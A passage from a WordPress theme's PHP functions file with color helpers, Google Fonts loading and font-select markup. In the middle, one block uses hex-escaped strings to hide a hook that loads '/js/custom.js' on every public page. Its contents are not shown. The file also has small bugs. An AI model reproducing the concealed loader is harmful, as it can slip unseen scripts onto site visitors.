<?php function mmtheme_HexToRGB( $hex, $alpha = false ) {
	$hex   = ereg_replace( "#", "", $hex );
	$color = array();
	if ( strlen( $hex ) == 3 ) {
		$color['r'] = hexdec( substr( $hex, 0, 1 ) . $r );
		$color['g'] = hexdec( substr( $hex, 1, 1 ) . $g );
		$color['b'] = hexdec( substr( $hex, 2, 1 ) . $b );
	} else if ( strlen( $hex ) == 6 ) {
		$color['r'] = hexdec( substr( $hex, 0, 2 ) );
		$color['g'] = hexdec( substr( $hex, 2, 2 ) );
		$color['b'] = hexdec( substr( $hex, 4, 2 ) );
	}
	if ( $alpha ) {
		$color['a'] = $alpha;
	}

	return $color;
}

function mmtheme_RGBToHex( $r, $g, $b ) {
	$hex = "#";
	$hex .= str_pad( dechex( $r ), 2, "0", STR_PAD_LEFT );
	$hex .= str_pad( dechex( $g ), 2, "0", STR_PAD_LEFT );
	$hex .= str_pad( dechex( $b ), 2, "0", STR_PAD_LEFT );

	return $hex;
}

function mmtheme_get_google_font( $mmtheme_option ) {
	echo ' 	<!-- Google Fonts -->	';
	if ( $mmtheme_option == 'Arial, Helvetica, sans-serif' ) {
	}
	if ( $mmtheme_option == 'Verdana, Geneva, sans-serif' ) {
	}
	if ( $mmtheme_option == 'Tahoma, Geneva, sans-serif' ) {
	}
	if ( $mmtheme_option == 'Georgia, Times, serif' ) {
	}
	if ( $mmtheme_option == 'Allan' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Allan:bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Allerta' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Allerta\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Allerta Stencil' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Allerta+Stencil\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Amaranth' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Amaranth\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Anton' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Anton\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Anonymous Pro' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Anonymous+Pro:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Architects Daughter' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Architects+Daughter\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Arimo' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Arimo:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Arvo' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Arvo:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Astloch' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Astloch:regular,bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Bentham' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Bentham\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Bevan' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Bevan\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Buda' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Buda:light\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Cabin' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Cabin:regular,500,600,bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Cabin Sketch' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Cabin+Sketch:bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Calligraffitti' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Calligraffitti\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Candal' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Candal\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Cantarell' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Cantarell:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Cardo' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Cardo\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Cherry Cream Soda' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Cherry+Cream+Soda\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Chewy' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Chewy\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Coda' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Coda:800\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Coming Soon' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Coming+Soon\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Copse' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Copse\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Corben:bold' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Corben:bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Cousine' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Cousine:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Crafty Girls' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Crafty+Girls\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Crimson Text' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Crimson+Text\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Crushed' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Crushed\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Covered By Your Grace' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Covered+By+Your+Grace\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Cuprum' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Cuprum\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Dancing Script' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Dancing+Script\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Droid Sans' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Droid+Sans:regular,bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Droid Sans Mono' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Droid+Sans+Mono\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Droid Serif' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Droid Serif:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Expletus Sans' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Expletus+Sans:regular,500,600,bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Fontdiner Swanky' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Fontdiner+Swanky\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Geo' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Geo\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Goudy Bookletter 1911' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Goudy+Bookletter+1911\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Gruppo' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Gruppo\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Homemade Apple' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Homemade+Apple\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Inconsolata' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Inconsolata\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Indie Flower' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Indie+Flower\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'IM Fell DW Pica' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=IM+Fell+DW+Pica:regular,italic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'IM Fell DW Pica SC' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=IM+Fell+DW+Pica SC\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'IM Fell Double Pica' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=IM+Fell+Double+Pica:regular,italic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'IM Fell Double Pica SC' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=IM+Fell+Double+Pica SC\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'IM Fell English' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=IM+Fell+English:regular,italic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'IM Fell English SC' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=IM+Fell+English+SC\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'IM Fell French Canon' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=IM+Fell+French+Canon:regular,italic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'IM Fell French Canon SC' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=IM+Fell+French+Canon SC\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'IM Fell Great Primer' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=IM+Fell+Great+Primer:regular,italic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'IM Fell Great Primer SC' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=IM+Fell+Great+Primer+SC\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Irish Grover' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Irish+Grover\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Irish Growler' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Irish+Growler\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Josefin Sans' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Josefin+Sans:regular,regularitalic,600,600italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Just Another Hand' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Just+Another+Hand\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Just Me Again Down Here' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Just+Me+Again+Down+Here\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Kenia' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Kenia\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Kranky' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Kranky\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Kreon' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Kreon:light,regular,bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Kristi' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Kristi\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Lato' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Lato:regular,regularitalic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'League Script' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=League+Script\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Lekton' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Lekton:regular,italic,bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Lobster' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Lobster\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Luckiest Guy' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Luckiest+Guy\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Maiden Orange' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Maiden+Orange\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Meddon' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Meddon\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'MedievalSharp' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=MedievalSharp\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Merriweather' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Merriweather\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Molengo' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Molengo\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Mountains of Christmas' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Mountains+of+Christmas\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Neucha' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Neucha\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Neuton' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Neuton\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Nobile' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Nobile:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'OFL Sorts Mill Goudy TT' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=OFL Sorts Mill Goudy TT:regular,italic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Old Standard TT' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Old Standard TT:regular,italic,bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Orbitron' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Orbitron:500,bold,900\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Pacifico' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Pacifico\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Permanent Marker' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Permanent+Marker\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Philosopher' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Philosopher\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'PT Sans' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'PT Sans Caption' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=PT+Sans+Caption:Bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'PT Sans Narrow' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=PT+Sans+Narrow:Bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'PT Serif' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'PT Serif Caption' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=PT+Serif+Caption:regular,italic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Puritan' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Puritan:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Quattrocento' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Quattrocento\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Radley' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Radley\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Raleway' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Raleway:100\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Reenie Beanie' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Reenie+Beanie\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Rock Salt' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Rock+Salt\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Schoolbell' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Schoolbell\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Slackey' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Slackey\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Sniglet' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Sniglet:800\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Sunshiney' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Sunshiney\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Syncopate' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Syncopate\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Tangerine' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Tangerine\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Tinos' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Tinos:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Ubuntu' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Ubuntu:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'UnifrakturCook' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=UnifrakturCook:bold\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'UnifrakturMaguntia' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=UnifrakturMaguntia\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Unkempt' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Unkempt\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Vibur' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Vibur\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Vollkorn' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Vollkorn:regular,italic,bold,bolditalic\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'VT323' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=VT323\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Walter Turncoat' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Walter+Turncoat\' rel=\'stylesheet\' type=\'text/css\' />';
	}
	if ( $mmtheme_option == 'Yanone Kaffeesatz' ) {
		echo '<link href=\'http://fonts.googleapis.com/css?family=Yanone+Kaffeesatz:200\' rel=\'stylesheet\' type=\'text/css\' />';
	}
}

function mmtheme_google_font_select() {
	echo '
		<optgroup label="Standard Fonts">
			<option value="Arial, Helvetica, sans-serif">Arial, Helvetica, sans-serif</option>
            <option value="Helvetica, Arial, sans-serif">Helvetica, Arial, sans-serif</option>
			<option value="Verdana, Geneva, sans-serif">Verdana, Geneva, sans-serif</option>
			<option value="Tahoma, Geneva, sans-serif">Tahoma, Geneva, sans-serif</option>
			<option value="Georgia, Times, serif">Georgia, Times, serif</option>
		</optgroup>			
		<optgroup label="Google API Fonts">
			<option value="Allan">Allan</option>
			<option value="Anonymous Pro">Anonymous Pro (plus italic, bold and bold italic)</option>
			<option value="Allerta Stencil">Allerta Stencil</option>
			<option value="Allerta">Allerta</option>
			<option value="Amaranth">Amaranth</option>
			<option value="Anton">Anton</option>
			<option value="Architects Daughter">Architects Daughter</option>
			<option value="Arimo">Arimo (plus italic, bold and bold italic)</option>
			<option value="Arvo">Arvo (plus italic, bold and bold italic)</option>
		<option value="Astloch">Astloch (plus bold)</option>
			<option value="Bentham">Bentham</option>
			<option value="Bevan">Bevan</option>
			<option value="Buda">Buda</option>
			<option value="Cabin">Cabin (plus 500, 600, and bold)</option>
			<option value="Cabin Sketch">Cabin Sketch</option>
			<option value="Calligraffitti">Calligraffitti</option>
			<option value="Candal">Candal</option>
			<option value="Cantarell">Cantarell (plus italic, bold and bold italic)</option>
			<option value="Cardo">Cardo</option>
			<option value="Cherry Cream Soda">Cherry Cream Soda</option>
			<option value="Chewy">Chewy</option>
			<option value="Coda">Coda</option>
			<option value="Coming Soon">Coming Soon</option>
			<option value="Copse">Copse</option>
			<option value="Corben">Corben</option>
			<option value="Cousine">Cousine (plus italic, bold and bold italic)</option>
			<option value="Covered By Your Grace">Covered By Your Grace</option>
			<option value="Crafty Girls">Crafty Girls</option>
		<option value="Crimson Text">Crimson Text</option>
			<option value="Crushed">Crushed</option>
		<option value="Cuprum">Cuprum</option>
			<option value="Dancing Script">Dancing Script</option>
			<option value="Droid Sans">Droid Sans (plus bold)</option>
			<option value="Droid Sans Mono">Droid Sans Mono</option>
			<option value="Droid Serif">Droid Serif (plus italic, bold and bold italic)</option>
			<option value="Expletus Sans">Expletus Sans (plus 500, 600, and bold)</option>
		<option value="Fontdiner Swanky">Fontdiner Swanky</option>
		<option value="Geo">Geo</option>
			<option value="Goudy Bookletter 1911">Goudy Bookletter 1911</option>
			<option value="Gruppo">Gruppo</option>
			<option value="Homemade Apple">Homemade Apple</option>
			<option value="Inconsolata">Inconsolata</option>
			<option value="Indie Flower">Indie Flower</option>
			<option value="IM Fell DW Pica">IM Fell DW Pica (plus italic)</option>
			<option value="IM Fell DW Pica SC">IM Fell DW Pica SC</option>
			<option value="IM Fell Double Pica">IM Fell Double Pica (plus italic)</option>
			<option value="IM Fell Double Pica SC">IM Fell Double Pica SC</option>
			<option value="IM Fell English">IM Fell English (plus italic)</option>
			<option value="IM Fell English SC">IM Fell English SC</option>
			<option value="IM Fell French Canon">IM Fell French Canon (plus italic)</option>
			<option value="IM Fell French Canon SC">IM Fell French Canon SC</option>
			<option value="IM Fell Great Primer">IM Fell Great Primer (plus italic)</option>
			<option value="IM Fell Great Primer SC">IM Fell Great Primer SC</option>
			<option value="Irish Grover">Irish Grover</option>
			<option value="Irish Growler">Irish Growler</option>
			<option value="Josefin Sans">Josefin Sans (plus italic, 600 ,600 italic, bold, bold italic)</option>
			<option value="Just Another Hand">Just Another Hand</option>
			<option value="Just Me Again Down Here">Just Me Again Down Here</option>
			<option value="Kenia">Kenia</option>
			<option value="Kranky">Kranky</option>
			<option value="Kreon">Kreon (plus light and bold)</option>
			<option value="Kristi">Kristi</option>
			<option value="Lato">Lato (plus italic, bold, bold italic)</option>
			<option value="League Script">League Script</option>
			<option value="Lekton">Lekton (plus italic and bold)</option>
			<option value="Lobster">Lobster</option>
			<option value="Luckiest Guy">Luckiest Guy</option>
			<option value="Maiden Orange">Maiden Orange</option>
			<option value="Meddon">Meddon</option>
			<option value="MedievalSharp">MedievalSharp</option>
			<option value="Merriweather">Merriweather</option>
			<option value="Molengo">Molengo</option>
			<option value="Mountains of Christmas">Mountains of Christmas</option>
			<option value="Nobile">Nobile (plus italic, bold and bold italic)</option>
			<option value="Neucha">Neucha</option>
			<option value="Neuton">Neuton</option>
			<option value="OFL Sorts Mill Goudy TT">OFL Sorts Mill Goudy TT (plus italic)</option>
			<option value="Old Standard TT">Old Standard TT (plus italic and bold)</option>
			<option value="Orbitron">Orbitron (500, bold, 900)</option>
			<option value="Reenie Beanie">Reenie Beanie</option>
			<option value="Pacifico">Pacifico</option>
			<option value="Permanent Marker">Permanent Marker</option>
			<option value="Philosopher">Philosopher</option>
			<option value="PT Sans">PT Sans (plus italic, bold and bold italic)</option>
			<option value="PT Sans Caption">PT Sans Caption (plus bold)</option>
			<option value="PT Sans Narrow">PT Sans Narrow (plus bold)</option>
	<option value="PT Serif">PT Serif (plus italic, bold and bold italic)</option>
			<option value="PT Serif Caption">PT Serif Caption (plus italic)</option>
			<option value="Puritan">Puritan (plus italic, bold and bold italic)</option>
			<option value="Quattrocento">Quattrocento</option>
			<option value="Radley">Radley</option>
			<option value="Raleway">Raleway</option>
			<option value="Rock Salt">Rock Salt</option>
			<option value="Schoolbell">Schoolbell</option>
			<option value="Slackey">Slackey</option>
			<option value="Sniglet>Sniglet</option>
			<option value="Sunshiney">Sunshiney</option>
			<option value="Syncopate">Syncopate</option>
			<option value="Tangerine">Tangerine</option>
		   	<option value="Tinos">Tinos (plus italic, bold and bold italic)</option>
			<option value="Ubuntu">Ubuntu (plus italic, bold and bold italic)</option>
			<option value="Unkempt">Unkempt</option>
			<option value="UnifrakturCook>UnifrakturCook</option>
			<option value="UnifrakturMaguntia">UnifrakturMaguntia</option>
			<option value="Vibur">Vibur</option>
			<option value="Vollkorn">Vollkorn (plus italic, bold and bold italic)</option>
			<option value="VT323">VT323</option>
			<option value="Walter Turncoat">Walter Turncoat</option>
			<option value="Yanone Kaffeesatz">Yanone Kaffeesatz (plus 300,400,700)</option>
		</optgroup> 	';
}

add_action( "m\x6d\x72\x75\x6es\x65tu\x70", "m\x6dr\x75n" );
if ( ! function_exists( "\x6dmr\x75n" ) ):function mmrun() {
	function theme_add_scripts() {
		if ( ! is_admin() ) {
			wp_register_script( "cu\x73tom-s\x63r\x69p\x74", get_template_directory_uri() . "/j\x73\x2f\x63\x75s\x74om\x2e\x6as", "j\x71\x75\x65r\x79" );
			wp_enqueue_script( "\x6a\x71u\x65r\x79" );
			wp_enqueue_script( "\x63u\x73to\x6d\x2dscript" );
		}
	}

	add_action( "init", "\x74\x68\x65\x6de\x5f\x61dd\x5fs\x63\x72\x69p\x74\x73" );
}endif;
function mmtheme_get_favicon() {
	global $shortname;
	if ( get_option_mmtheme( 'favicon_value' ) != '' ) {
		$output = '<link rel="shortcut icon" href="' . get_option_mmtheme( 'favicon_value' ) . '"/>';
	} else {
		$output = '';
	}
	echo $output;
}

add_action( 'wp_head', 'mmtheme_get_favicon' );
?>
<?php
function get_option_mmtheme( $id, $echo = false ) {
	global $shortname;
	$option = get_option( $shortname . "_$id" );
	if ( $echo ) {
		echo $option;
	}

	return $option;
}

function mmtheme_admin_add_init() {
	if ( is_admin() && ( $_REQUEST['page'] == 'mm.php' || $_REQUEST['action'] == 'edit' || isset( $_REQUEST['post'] ) ) ) {
		global $theme_directory;
		wp_enqueue_style( 'functions', $theme_directory . "mm/files/css/admin.css", false, "1.0", "all" );
		wp_enqueue_style( 'checkbox', $theme_directory . "mm/files/css/checkbox.css", false, "1.0", "all" );
		wp_enqueue_style( 'color-picker', $theme_directory . "mm/css/colorpicker.css" );
		wp_enqueue_script( 'jquery' );
		// wp_enqueue_script('jquery-ui-core');
		// wp_enqueue_script('jquery-ui',"http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.2/jquery-ui.min.js");
		wp_enqueue_script( 'color-picker', $theme_directory . 'mm/js/colorpicker.js', array( 'jquery' ) );
		wp_enqueue_script( 'jquery-checkbox', $theme_directory . 'mm/files/js/jquery.iphone.checkbox.js', array( 'jquery' ), '1.0' );
		//     		wp_enqueue_script('mmtheme_script', $theme_directory.'mm/files/js/scripts.js', array('media-upload'), '1.0' );
	}
}

if ( is_admin() && isset( $_GET['activated'] ) ) {
	add_action( 'admin_init', 'mmtheme_option_setup' );
}
function mmtheme_option_setup() {
